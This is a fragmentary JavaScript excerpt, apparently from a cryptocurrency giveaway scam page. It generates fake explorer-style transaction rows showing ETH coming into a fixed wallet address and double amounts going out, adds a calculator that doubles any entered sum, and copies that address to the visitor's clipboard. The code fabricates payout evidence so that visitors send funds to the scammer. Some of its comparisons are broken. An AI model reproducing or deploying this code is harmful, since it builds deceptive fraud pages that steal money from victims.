...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x98E3b489CF416861F6F47A32cBFAdF4B414613Ec</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x98E3b489CF416861F6F47A32cBFAdF4B414613Ec</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
    send_amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
  ...
  (row.innerHTML =
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x98E3b489CF416861F6F47A32cBFAdF4B414613Ec</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount +
        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
(get_random = function(
  ...
  $("#cal-in").on("input", () => {
    ...
    if (in_amount > 0 && in_amount < 600) {
      $("#cal-out").val(in_amount * 2);
    } else if (in_amount => 5 && in_amount <= 600) {
...
$("#cal-out").on("input", () => {
  ...
  } else if (in_amount => 600 && in_amount <= 600) {
...
$("#copy_address").click(() => {
  $("#copy_address").attr("data-clipboard-text", "0x98E3b489CF416861F6F47A32cBFAdF4B414613Ec");
